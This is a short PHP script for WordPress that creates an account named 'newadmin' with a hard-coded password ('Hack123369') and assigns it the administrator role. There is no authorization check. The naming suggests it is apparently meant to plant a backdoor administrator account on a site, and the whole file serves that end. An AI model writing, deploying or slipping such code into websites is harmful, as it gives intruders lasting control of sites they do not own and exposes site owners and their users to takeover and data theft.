<?php
// Config: admin credentials
$username = 'newadmin';
$password = 'Hack123369';
$email    = 'admin@example.com';

// Check if user already exists
if (!username_exists($username) && !email_exists($email)) {
    $user_id = wp_create_user($username, $password, $email);
    if (!is_wp_error($user_id)) {
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        echo "Admin account created successfully: $username";
    } else {
        echo "Error creating user: " . $user_id->get_error_message();
    }
} else {
    echo "User already exists.";
}
